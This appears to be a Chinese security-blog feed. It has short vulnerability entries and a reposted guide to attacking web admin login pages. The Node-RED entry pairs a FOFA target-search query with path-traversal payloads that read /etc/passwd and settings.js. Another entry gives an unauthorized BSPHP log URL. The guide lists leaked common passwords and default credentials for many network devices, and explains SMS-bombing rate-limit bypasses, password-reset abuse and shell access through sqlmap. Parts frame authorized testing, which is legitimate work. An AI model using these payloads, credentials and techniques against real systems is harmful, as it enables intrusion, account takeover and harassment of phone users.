      <link href="/2021/07/17/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Node-RED%20ui_base%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/17/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Node-RED%20ui_base%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="Node-RED-ui-base-任意文件读取漏洞"><a href="#Node-RED-ui-base-任意文件读取漏洞" class="headerlink" title="Node-RED ui_base 任意文件读取漏洞"></a>Node-RED ui_base 任意文件读取漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Node-RED 在/nodes/ui_base.js中，URL与’/ui_base/js/*’匹配，然后传递给path.join，</p><p>缺乏对最终路径的验证会导致路径遍历漏洞，可以利用这个漏洞读取服务器上的敏感数据，比如settings.js</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote><p>[!NOTE]</p><p>Node-RED</p></blockquote><h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><blockquote><p>[!NOTE]</p><p>title=”Node-RED”</p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问页面</p><p><img src="https://img-blog.csdnimg.cn/img_convert/346971a9318cc350e4a2e701ae15460c.png" alt="image-20210701185722667"></p><p>验证POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</span><br><span class="line">/ui_base/js/..%2f..%2f..%2f..%2fsettings.js</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/0b7ef8b4a6f8c62354d491da385c0da6.png" alt="image-20210701185812622"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/7e922f160ad22a13c67e04b91230f150.png" alt="image-20210704171045540"></p>]]></content>
      
      
      <categories>
          
          <category> 任意文件读取 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BSPHP存在未授权访问</title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/BSPHP/BSPHP%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/BSPHP/BSPHP%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="BSPHP存在未授权访问"><a href="#BSPHP存在未授权访问" class="headerlink" title="BSPHP存在未授权访问"></a>BSPHP存在未授权访问</h1><p>该处泄漏的⽤户名和用户登陆 IP</p><p>URL格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/admin/index.php?m=admin&amp;c=log&amp;a=table_json&amp;json=get&amp;soso_ok=1&amp;t=user_login_log&amp;page=1&amp;limit=10&amp;</span><br></pre></td></tr></table></figure><p>直接进行访问即可获得如下数据</p><p><img src="./BSPHP存在未授权访问/wp_editor_md_90752b3880f4de0612a22c38542748d8.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞库 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>谈谈对后台登录页面的渗透测试</title>
      <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E8%B0%88%E8%B0%88%E5%AF%B9%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E8%B0%88%E8%B0%88%E5%AF%B9%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>本来是想写漏洞文章的，但是看见这篇文章，觉得这篇文章对渗透经验少的人可能会有点帮助，是可以让新手有所收获的文章，所以放上博客</p><h2 id="原文：谈谈对后台登录页面的渗透测试"><a href="#原文：谈谈对后台登录页面的渗透测试" class="headerlink" title="原文：谈谈对后台登录页面的渗透测试"></a>原文：<a href="https://www.anquanke.com/post/id/185426" target="_blank" rel="noopener">谈谈对后台登录页面的渗透测试</a></h2><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>有些朋友在渗透时扫描到后台登陆界面，却不知道如何入手。最近刚好在某公司做渗透实习，对目标固定的系统渗透有些体会。因此这里讲一下对网站后台登陆界面的渗透思路，希望能为大家提供一些帮助。</p><h2 id="0x01-开始"><a href="#0x01-开始" class="headerlink" title="0x01 开始"></a>0x01 开始</h2><p>本人在进入登陆界面时，一般都是先用万能密码什么的测下输入框有没有注入（现在很少见了）。如果没有，那就先拿admin，123456什么的测试下弱口令，不求运气爆棚一下就猜到密码。主要是看下回显，查看是否存在账号锁定策略，密码不正确，不存在此用户名等信息，以便于尝试遍历可能存在的用户名。没验证码就上爆破工具，有验证码的话看看能不能绕过,实在不行手工测几个账号密码碰碰运气。</p><h2 id="0x02-爆破"><a href="#0x02-爆破" class="headerlink" title="0x02 爆破"></a>0x02 爆破</h2><p>如果没验证码阻碍，那爆破没什么好说的，拿个好字典，直接干就是了。</p><p>不过注意下有时密码传输会使用md5或者base64之类的加密，这时除了自己写脚本外，可以使用burpsuite的intruder模块<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6thmeqhnfj30v10l2tap.jpg" alt><br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6thmw22wqj30uk0bxdgp.jpg" alt><br>爆破的传统思路都是固定账号爆破密码，还有一种姿势是固定密码爆破用户名。比如使用固定密码123456，爆破常用用户名或者常用人名拼音。</p><h2 id="0x03-扫目录"><a href="#0x03-扫目录" class="headerlink" title="0x03 扫目录"></a>0x03 扫目录</h2><p>目录扫描也是一个存在惊喜的地方，说不定能扫描到后台未授权访问的链接、备份文件、编辑器、敏感信息等。</p><p>像后台登陆的网址看多了，常规的路径像<a href="http://www.xxx.com/admin/login.aspx(.php)" target="_blank" rel="noopener">www.xxx.com/admin/login.aspx(.php)</a></p><p>老司机甚至不用御剑什么的工具跑，就能直接猜到。</p><p>一般碰到下面这种情况，可采用fuzz大法。一层一层fuzz，尝试寻找可利用的信息。漏洞银行有一期衬衫的视频fuzz讲得很好。他用的工具是wfuzz，感觉不错，感兴趣的可以去看看。<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6thndmouej30up0ekgnf.jpg" alt><br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thno21asj30tt0f1abo.jpg" alt></p><p><strong>这里给大家讲一下我做授权渗透的一个案列:</strong></p><p>一般给客户的后台系统做渗透，客户都会给个测试账号，除了测登陆界面外，还测下后台的功能模块。但这次当我问客户要账号密码时，客户回：你们不是要模拟黑客做渗透测试吗，那就自己打进去啊。( ╯□╰ )好吧，作为实习生的我也只能硬着头皮刚登陆界面了。</p><p>先看了下链接，发现是Java站，且链接是.do结尾，但struct2工具试了下没成功。<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tho3of7mj30uj08bgmz.jpg" alt><br>看了下登陆界面，有验证码，网站看去的版本也挺新的，感觉不太好搞。<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thoghp6aj30if096t9c.jpg" alt><br>测下注入无果，于是抓包看下验证码是否可以绕过或者不变，结果这个验证码很称职，爆破不了。验证码辨认还算清楚，不过验证码识别，总觉得不太靠谱。。。等绝望了找不到洞再试吧。于是去扫了下目录。诶，发现有好东西。<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thovfgsjj30au087767.jpg" alt><br>首先扫到了一个services服务路径<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6thpfty87j30u10d276h.jpg" alt><br>知道了Apache Axis组件的版本信息<br><img src="https://imgchr.com/i/ntKnXQ" alt><br>然后马上想到这个组件当时刚爆出一个RCE漏洞</p><p>poc链接：<a href="https://github.com/KibodWapon/Axis-1.4-RCE-Poc" target="_blank" rel="noopener">https://github.com/KibodWapon/Axis-1.4-RCE-Poc</a></p><p>结果试了下没成功。然后再尝试了四月份CNVD看到的RCE漏洞也无果。</p><p>还扫出了一个ckfinder编辑器<br><a href="http://xxx.xxx.com/ckfinder/ckfinder.html" target="_blank" rel="noopener">http://xxx.xxx.com/ckfinder/ckfinder.html</a></p><p><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti4gao3lj30ty0cqwg5.jpg" alt><br>一看，我滴乖乖，难道已经有黑客搞进去了？</p><p>赶紧网上找了下这个版本有存在什么漏洞，并尝试文件上传绕过。但很遗憾，这个网站并不存在解析漏洞，利用不了，文件上传也没绕过。不过令人庆幸的是，黑客应该也没有利用成功。</p><p>。。。</p><p>又挖了一段时间，同事竟然说他拿shell了！</p><p>what?<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti4wgekgj308g083jtx.jpg" alt><br>发现他扫目录扫到了<a href="http://xxx.xx.com/manager/html" target="_blank" rel="noopener">http://xxx.xx.com/manager/html</a><br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti62iseaj30sw09l421.jpg" alt><br>然后一个admin/123456弱口令进入tomcat后台，然后传war包成功拿到shell<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6ti6h08nrj30pi07bt97.jpg" alt><br>看了这波操作久久无语，看来我的字典太差，tomcat目录都没扫出来。还有弱口令漏洞，真的很无敌。</p><h2 id="0x04-框架漏洞"><a href="#0x04-框架漏洞" class="headerlink" title="0x04 框架漏洞"></a>0x04 框架漏洞</h2><p>对一些CMS，已经比较成熟了，漏洞确实不好挖。如果网上（乌云，seebug，搜索引擎等）的历史漏洞没有复现成功，那一般情况下就只能寻找下逻辑漏洞、网站管理员配置错误或者弱口令什么的。</p><p>对于一些不知名的框架，一般也可通过登陆界面底下的声明中找到开发公司和产品版本时间。</p><p><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6ti7a4kvuj30g901sjrn.jpg" alt></p><p>在网上找找此公司产品是否爆出过漏洞。若是开源的框架，还可下载源码进行代码审计寻找漏洞。</p><p>像java的站，登陆页面是.do或.action的网址。可尝试下 struts2 命令执行漏洞，本人一般使用安恒的S2漏洞验证工具。<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6ti7r0kimj30vk0o4ak5.jpg" alt><br>又如thinkphp的CMS，可尝试下是否存在相应版本的命令执行漏洞。本人曾在邮储银行的一个系统登陆界面挖到tp5命令执行漏洞拿到shell，补天评了1700元。</p><p>emmmm,当然厂商说漏洞无影响给拒了就是另一回事了……<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6ti83uxffj307y05ojsk.jpg" alt></p><h2 id="0x05-弱口令"><a href="#0x05-弱口令" class="headerlink" title="0x05 弱口令"></a>0x05 弱口令</h2><p>可能有些小伙伴对弱口令嗤之以鼻，觉得它没有技术含量，但其实不然，结合社工，它的作用和危害可能比其他漏洞更大，希望大家重视。</p><p>刚巧最近有去公安厅复测6月HW的漏洞，检测漏洞是否修复。几十份报告，原以为要花很长时间，但结果却是：差不多半小时就完成了，且部分时间是花在输入网址上（报告不给拷到自己电脑上，只能看着公安厅电脑的报告手打网址）。</p><p>耗时少的其中一个原因是漏洞有八、九层的漏洞都是弱口令，其中大部分漏洞还都是部委级别的系统，所以测的很快。虽然hw期间比较特殊，还是比例这么大还是挺能说明问题的。</p><p><strong>以下是某大佬对14年底12306泄露密码的统计分析</strong></p><p>哈哈，可以发现我国还是对数字情有独钟，国外的top100弱口令还是不适合我大天朝的国情。很少有password,football之类的英文密码。</p><p>密码中包含有 123456 数字的，出现 3236 次<br>密码中包含有 123 数字的，出现 11213 次<br>密码中包含有 520 数字的，出现 4549 次<br>密码中包含有 1314 数字的，出现 3113 次<br>密码中包含有 aini 的，出现 877 次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">次数 密码</span><br><span class="line">392 123456</span><br><span class="line">281 a123456</span><br><span class="line">165 123456a</span><br><span class="line">161 5201314</span><br><span class="line">157 111111</span><br><span class="line">136 woaini1314</span><br><span class="line"> 98 qq123456</span><br><span class="line"> 98 123123</span><br><span class="line"> 97 000000</span><br><span class="line"> 93 1qaz2wsx</span><br><span class="line"> 83 1q2w3e4r</span><br><span class="line"> 80 qwe123</span><br><span class="line"> 76 7758521</span><br><span class="line"> 68 123qwe</span><br><span class="line"> 63 a123123</span><br><span class="line"> 56 woaini520</span><br><span class="line"> 55 123456aa</span><br><span class="line"> 52 1314520</span><br><span class="line"> 52 100200</span><br><span class="line"> 51 woaini</span><br><span class="line"> 50 woaini123</span><br><span class="line"> 50 123321</span><br><span class="line"> 49 q123456</span><br><span class="line"> 49 123456789</span><br><span class="line"> 48 asd123</span><br><span class="line"> 48 a123456789</span><br><span class="line"> 48 5211314</span><br><span class="line"> 48 123456789a</span><br><span class="line"> 47 z123456</span><br><span class="line"> 47 asd123456</span><br><span class="line"> 45 a5201314</span><br><span class="line"> 42 zhang123</span><br><span class="line"> 41 aa123456</span><br><span class="line"> 40 123123a</span><br><span class="line"> 38 aptx4869</span><br><span class="line"> 37 1qazxsw2</span><br><span class="line"> 37 1q2w3e4r5t</span><br><span class="line"> 36 5201314a</span><br><span class="line"> 35 aini1314</span><br><span class="line"> 35 1q2w3e</span><br><span class="line"> 34 woaini521</span><br><span class="line"> 34 q1w2e3r4</span><br><span class="line"> 34 31415926</span><br><span class="line"> 34 123456qq</span><br><span class="line"> 33 a111111</span><br><span class="line"> 33 520520</span><br><span class="line"> 33 1234qwer</span><br><span class="line"> 29 123456abc</span><br><span class="line"> 29 111111a</span><br><span class="line"> 29 110110</span><br><span class="line"> 28 w123456</span><br><span class="line"> 28 abc123</span><br><span class="line"> 28 7758258</span><br><span class="line"> 26 iloveyou</span><br><span class="line"> 26 159753</span><br><span class="line"> 25 qwer1234</span><br><span class="line"> 25 a000000</span><br><span class="line"> 24 zxc123</span><br><span class="line"> 24 123qweasd</span><br><span class="line"> 24 123654</span><br><span class="line"> 23 qq123123</span><br><span class="line"> 23 abc123456</span><br><span class="line"> 23 123456q</span><br><span class="line"> 22 qq5201314</span><br><span class="line"> 22 12345678</span><br><span class="line"> 21 456852</span><br><span class="line"> 21 000000a</span><br><span class="line"> 20 1314521</span><br><span class="line"> 19 zxc123456</span><br><span class="line"> 19 asdasd</span><br><span class="line"> 19 as123456</span><br><span class="line"> 19 666666</span><br><span class="line"> 19 521521</span><br><span class="line"> 19 112233</span><br><span class="line"> 18 q1w2e3</span><br><span class="line"> 18 abcd1234</span><br><span class="line"> 18 aaa123</span><br><span class="line"> 17 qazwsx123</span><br><span class="line"> 17 qaz123</span><br><span class="line"> 17 aaaaaa</span><br><span class="line"> 17 a123321</span><br><span class="line"> 17 12qwaszx</span><br><span class="line"> 17 123000</span><br><span class="line"> 17 11111111</span><br><span class="line"> 16 zxcvbnm123</span><br><span class="line"> 16 wang123</span><br><span class="line"> 16 s123456</span><br><span class="line"> 16 nihao123</span><br><span class="line"> 16 love1314</span><br><span class="line"> 16 caonima123</span><br><span class="line"> 16 asdasd123</span><br><span class="line"> 16 753951</span><br><span class="line"> 16 5845201314</span><br><span class="line"> 16 584520</span><br><span class="line"> 16 159357</span><br><span class="line"> 16 147258</span><br><span class="line"> 16 1123581321</span><br><span class="line"> 16 110120</span><br><span class="line"> 15 hao123</span><br><span class="line"> 15 a7758521</span><br></pre></td></tr></table></figure></p><p><strong>遇到网络设备，基本像交换机、路由器、安全设备之类的，可以尝试一下默认密码</strong></p><p>网上找到的，但忘了是哪个大佬发的了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254 用户名:superman 密码:talent 技术支持热线：8008105119</span><br><span class="line">天融信防火墙，不需要证书 登录地址:https://192.168.1.254：8080 用户名:superman 密码:talent！23 遇到设备需要把旧设备配置备份下来，再倒入新设备基于console口登陆，用户名，密码跟web界面一致 system config reset 清除配置 save 保存 联想网御防火墙，需要证书（最好用IE浏览器登录）</span><br><span class="line">登录地址:https://10.1.5.254:8889 用户名:admin 密码:leadsec@7766、administrator、bane@7766 技术支持热线：4008107766 010-56632666</span><br><span class="line">深信服防火墙（注安全设备管理地址不是唯一的） https://10.251.251.251</span><br><span class="line">https://10.254.254.254 用户名：admin 密码：admin 技术支持热线：4006306430</span><br><span class="line">启明星辰 https://10.1.5.254:8889 用户名：admin 密码：bane@7766</span><br><span class="line">https://10.50.10.45:8889 用户名：admin 密码：admin@123 电脑端IP：10.50.10.44/255.255.255.0 技术支持热线：4006243900</span><br><span class="line">juniper 登录地址:https://192.168.1.1 用户名:netscreen 密码:netscreen</span><br><span class="line">Cisco 登录地址:https://192.168.0.1 用户名:admin 密码:cisco</span><br><span class="line">Huawei 登录地址:http://192.168.0.1 用户名:admin 密码:Admin@123</span><br><span class="line">H3C 登录地址:http://192.168.0.1 用户名:admin 密码:admin 技术支持热线：4006306430</span><br><span class="line">绿盟IPS https://192.168.1.101 用户名: weboper 密码: weboper 配置重启生效</span><br><span class="line">网神防火墙GE1口 https://10.50.10.45 用户名：admin 密码：firewall 技术支持热线：4006108220</span><br><span class="line">深信服VPN： 51111端口 delanrecover</span><br><span class="line">华为VPN：账号：root 密码：mduadmin</span><br><span class="line">华为防火墙： admin Admin@123 eudemon</span><br><span class="line">eudemon Juniper防火墙： netscreen netscreen</span><br><span class="line">迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)</span><br><span class="line">山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone</span><br><span class="line">安恒的明御防火墙 admin/adminadmin</span><br><span class="line">某堡垒机 shterm/shterm</span><br><span class="line">天融信的vpn test/123456</span><br></pre></td></tr></table></figure></p><h2 id="0x06-社工"><a href="#0x06-社工" class="headerlink" title="0x06 社工"></a>0x06 社工</h2><p>在我看来社工是很牛逼的一种攻击方式，有时可以四两拨千斤。</p><p>像教育站，登陆账号可能是学号，密码是身份证后六位。百度查xxx学校一卡通丢失，一般就能从某学生的失物启示找到学号。</p><p>或者在文章标题下，若存在作者名字，可能就是用户名<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti8jhd44j30r403mwg4.jpg" alt><br>密码除结合管理员电话，qq，姓名等外，还可注意下网站的一些关键词。曾挖过一个弱口令漏洞，密码是网站域名+123，都不用生成字典就进后台了。</p><p>最近刚好参加某省护网，讲个例子：对某系统爆破admin用户的密码没成功，于是在联系我们处找到了管理员的一些信息，想生成社工字典试下运气。</p><p><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6ti8y4ebkj30rc0dhdg0.jpg" alt></p><p>本想直接用社工密码生成工具生成字典爆破一下的，但突然想到注册处可以遍历用户名是否存在</p><p><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6ti9fkjngj315a0ao406.jpg" alt></p><p>于是结合社工尝试几个账号，发现联系我们处的管理员的账号是姓氏首字母加名字全拼，然后一爆破，密码123456直接进去后台。并在后台的搜索处发现Sql注入，再用sqlmap神器的命令 —os-shell成功打开xpcmdshell，拿到系统权限。</p><p>社工密码字典生成,怕麻烦的可使用在线网站生成：<a href="http://tools.mayter.cn/" target="_blank" rel="noopener">http://tools.mayter.cn/</a><br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tiarmsq2j30tw0h5my0.jpg" alt></p><p>也可使用cupp这款工具，这是一款交互式的工具，使用比较简单</p><p>地址：<a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a></p><p><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6tibbbjjoj30tp0eogvv.jpg" alt></p><p><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tibo6uqfj30ug04m42p.jpg" alt></p><p>看看生成的密码：<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6tic28hgzj30nk0ekn58.jpg" alt></p><p><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6ticex24vj30q90cq10e.jpg" alt></p><p>另一款是cewl，它通过爬行网站获取关键信息创建一个密码字典。</p><p>但我用了下，感觉生成的字典比较多冗余信息，很多关联不大的汉字都包含在字典中，个人觉得不是特别好用。</p><p>还有最近freebuf看了一篇文章，才发现hashcat这款爆破工具也能生成社工字典，感兴趣的朋友也可以去试试。</p><p>0x07 逻辑漏洞<br>逻辑漏洞是由于一些程序员未考虑到或者为贪图省事，而造成的逻辑上的漏洞，一般waf不容易拦截，因此和弱口令漏洞都是现在相对容易挖掘的一类漏洞。逻辑漏洞种类十分丰富，这里讲登陆框的逻辑漏洞，主要介绍一些技巧给大家拓宽一下思路，讲的不全请见谅。更详细的漏洞细节大家可以在网上查找资源（绝不是因为我懒）。</p><p>注册与忘记密码模块<br>云短信接受平台</p><p>相信有些朋友在测试注册模块的时候，会使用自己的手机号，而这就带来隐患：信息泄露，和短信骚扰。</p><p>这里给大家提供两个短信接受平台，让大家免去烦恼：</p><p><a href="https://www.pdflibr.com/" target="_blank" rel="noopener">https://www.pdflibr.com/</a><br><a href="https://www.pdflibr.com/" target="_blank" rel="noopener">http://www.smszk.com/</a></p><p><strong>遍历已注册用户</strong></p><p>这个上面的社工例子有讲，可查到用户是否存在。<br><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6tid3lj8rj30tx07ht9m.jpg" alt></p><p>**任意用户注册</p><p>注册用户不需验证码认证即可注册成功的情况下，可使用工具发包，恶意批量注册用户。</p><p><strong>修改发送包邮箱尝试覆盖注册</strong></p><p>注册时显示某用户已注册；<br>在注册新用户时抓包，更改自己的账号信息为admin用户；<br>可能可以覆盖admin用户，重新注册成功。<br>任意密码重置</p><p>修改密码时使用其他人的手机号，可抓包更改成自己的手机号。自己手机收到验证信息并输入，可更改他人密码成功。</p><p><strong>跳过验证</strong></p><p>跳过验证步骤、找回方式，直接到设置新密码页面</p><p>这里直接用乌云的例子说明应该就懂了。</p><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-098765.html" target="_blank" rel="noopener">中国电信某IDC机房信息安全管理系统设计缺陷致使系统沦陷</a></p><p><strong>短信轰炸</strong></p><p>短信轰炸，一般人可能抓包重放失败后就放弃了。这里有个技巧，</p><p>是从西门吹雪师傅博文里学到的绕过的姿势：</p><p>发送短信处一般每隔60秒才能发送一次<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tidgpb01j30tt0czdip.jpg" alt></p><p>但若是发包时在手机号后加上一个空格、加号或换行符等特殊字符。然后重新发送，这时若发送成功，则说明可绕过限制。</p><p><img src="https://tva4.sinaimg.cn/large/005R6Otmgy1g6tidx88r2j30uc0fo41a.jpg" alt></p><p>此时在intruder模块只要持续递增空格就可造成无限短信轰炸</p><p><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tiebp2jmj30sw0nyk2v.jpg" alt><br><a href="http://ximcx.cn/post-143.html" target="_blank" rel="noopener">博文链接</a></p><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p><strong>越权访问目录</strong></p><p>可越权访问到后台路径，网站组件配置文件，备份文件等，当然扫目录字典也要好。</p><p><strong>修改身份标识</strong></p><p>更改成功登陆的用户的身份标识，可能就能越权访问到其他用户的页面。</p><p>例如：1、本人之前曾用test用户弱口令漏洞登陆成功，然后更改参数越权访问到admin用户；2、曾看过一漏洞：用户认证的token值是用户名加时间戳的md5值，而恰好数据包某处就有返回用户名加时间戳，然后更改时间戳前的用户名，md5后加在token上成功越权到其他用户上（这种漏洞一般需要细心查找登陆时身份认证参数的规律）</p><p>之前的任意密码重置等漏洞，其实也是修改用户身份标识，系统认证机制不完善导致漏洞出现。</p><p><strong>抓返回包</strong></p><p>在登陆时返回包可能返回用户敏感信息，此时改一改参数说不定还能越权查到其他用户信息。</p><p>或注册、找回密码发送短信邮箱时，可能直接返回验证码等</p><p>在返回包里，更改下参数为true、success、1，可能就能未授权进入后台</p><p>1登陆抓包，点击右键，抓取返回包<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tiepy71tj30th0b70u7.jpg" alt><br>2观察返回的参数<br><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tif4gp1bj30kl08e3z8.jpg" alt><br>3更改参数<br><img src="https://tva2.sinaimg.cn/large/005R6Otmgy1g6tiffyxc3j30gi07o750.jpg" alt><br>4成功进入后台</p><p><strong>禁用js</strong></p><p>曾经碰到过一个站点，能未登陆访问后台首页，但再次点击就会退出到登陆页面。此时禁用js，然后成功访问部分功能模块，成功利用文件上传拿到webshell。</p><p>因为有些网站的Url跳转是由前端js控制，这时禁用js后说不定就能成功访问。</p><p>下面是火狐的一个禁用js的插件<br><img src="https://tva1.sinaimg.cn/large/005R6Otmgy1g6tifsq9hbj30tq05vt92.jpg" alt></p><h2 id="0x08-看网站源码信息"><a href="#0x08-看网站源码信息" class="headerlink" title="0x08 看网站源码信息"></a>0x08 看网站源码信息</h2><p>当你思路枯竭的时候不妨看看源码，它是一块宝藏，说不定就能在里面发现惊喜。有些程序员会把后台的功能链接放在前端源码中,说不定就存在未授权访问，甚至有些奇葩程序员在前端代码存放测试的账号密码。</p><p>首先给大家推荐一款工具，很强大：JSFinder</p><p>链接：<a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a></p><p>这是一款在网站的js文件中提取URL，子域名的工具，用在后台登陆界面抓取一些敏感的js文件效果也很不错，我曾用它抓取过网站后台的一个插件源码，后台的功能链接，敏感信息，接口链接（存在xss，注入）等等。我同学还说过burp也有抓js的插件，但可惜我没找到，用这款也差不多够用了。</p><p><img src="https://tva3.sinaimg.cn/large/005R6Otmgy1g6tig6pniuj30tw0irte6.jpg" 